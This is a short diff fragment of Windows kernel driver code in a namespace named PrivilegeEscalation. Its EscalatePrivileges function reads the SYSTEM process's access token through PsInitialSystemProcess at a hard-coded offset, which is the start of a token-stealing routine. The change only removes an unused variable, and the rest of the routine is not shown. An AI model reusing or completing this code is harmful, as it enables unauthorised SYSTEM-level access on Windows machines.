@@ -3,7 +3,7 @@
 namespace PrivilegeEscalation {
 
 	auto EscalatePrivileges() -> void {
-		NTSTATUS status = STATUS_SUCCESS;
+		
 		auto initialProcess = PsInitialSystemProcess;
 		DbgPrint("Initial process : %llx\n", reinterpret_cast<uintptr_t>(initialProcess));
 		auto initialToken = *reinterpret_cast<void**>((UCHAR*)initialProcess + 0x360);
